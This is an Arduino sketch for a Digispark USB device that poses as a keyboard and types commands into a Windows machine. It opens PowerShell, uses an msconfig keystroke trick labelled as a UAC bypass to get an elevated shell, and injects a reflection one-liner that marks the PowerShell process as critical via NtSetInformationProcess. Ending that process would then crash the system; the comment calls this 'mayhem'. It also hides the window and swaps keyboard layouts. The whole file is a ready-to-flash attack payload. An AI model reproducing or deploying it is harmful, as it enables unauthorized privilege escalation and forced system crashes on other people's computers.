#include "DigiKeyboard.h"
#define KEY_DOWN 0x51

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}
void loop() {

  // Open PowerShell
   
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Set Layout to US
  
  DigiKeyboard.print("Set");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("WinUserLanguageList ");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("Force en");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("US");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Exploit (Add your code here)
  
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("msconfig -5"); //starting msconfig
  DigiKeyboard.delay(1000);
 for(int bii =0; bii < 14; bii++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    } 
  DigiKeyboard.sendKeyStroke(KEY_L, MOD_ALT_LEFT); //bypassing UAC
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell"); //starting powershell
  DigiKeyboard.delay(1000);
  DigiKeyboard.println(F("$F=NEW-OBJECT SYSTEM.REFLECTION.ASSEMBLYNAME('BS');$B=[APPDOMAIN]::CURRENTDOMAIN.DEFINEDYNAMICASSEMBLY($F,[REFLECTION.EMIT.ASSEMBLYBUILDERACCESS]::RUN);$C=$B.DEFINEDYNAMICMODULE('BS', $FALSE);$E=$C.DEFINETYPE('BS.WIN32.NTDLL', 'PUBLIC, CLASS');$D=$E.DEFINEPINVOKEMETHOD('NtSetInformationProcess', 'NTDLL.DLL',([REFLECTION.METHODATTRIBUTES]'PUBLIC, STATIC'),[REFLECTION.CALLINGCONVENTIONS]::STANDARD,[INT32],[TYPE[]]@([INTPTR],[UINT32],[INTPTR].MAKEBYREFTYPE(),[UINT32]),[RUNTIME.INTEROPSERVICES.CALLINGCONVENTION]::WINAPI,[RUNTIME.INTEROPSERVICES.CHARSET]::AUTO);$J=$E.CREATETYPE();$H=[DIAGNOSTICS.PROCESS]::GETCURRENTPROCESS().HANDLE;$I=[SYSTEM.RUNTIME.INTEROPSERVICES.MARSHAL]::ALLOCHGLOBAL(4);$A=29;$G=4;$NULL=$J::NtSetInformationProcess($H, $A,[REF]$I, $G);")); //adding mayhem

  //turn on led when program finishes

  DigiKeyboard.delay(200);  
  digitalWrite(1, HIGH); 
  
  // Set Layout to DE

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -noexit -command \"mode con cols=18 lines=1\""); //smallest window possible
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Set-WinUserLanguageList -Force de-DE");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
